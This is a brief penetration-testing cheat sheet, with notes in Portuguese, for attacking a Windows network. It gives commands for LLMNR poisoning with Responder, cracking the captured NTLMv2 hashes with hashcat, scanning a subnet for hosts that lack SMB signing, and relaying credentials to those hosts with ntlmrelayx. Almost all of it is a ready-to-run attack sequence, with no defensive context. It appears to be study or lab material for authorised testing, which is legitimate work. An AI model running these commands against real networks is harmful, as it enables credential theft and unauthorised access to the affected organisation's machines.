# LLMNR Poisoning 

sudo responder -I eth0 -dwP
hashcat –m 5600 <hashfile.txt> <wordlist.txt>

# SMB Relay Attacks

nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24

Reuniremos todas as estações de trabalho sem assinatura SMB imposta e as colocaremos em um arquivo chamado targets.txt 



Utilizaremos Responder e ntlmrelayx para nosso ataque. Devemos primeiro configurar adequadamente o Responder para desabilitar as respostas SMB e HTTP, pois elas serão encaminhadas para ntlmrelayx (e eventualmente retransmitidas).

sudo nano  /etc/responder/Responder.conf

sudo responder –I eth0 -dwP



Por fim, iniciaremos o ntlmrelayx e aguardaremos a ocorrência de um evento.

sudo ntlmrelayx.py –tf targets.txt –smb2support

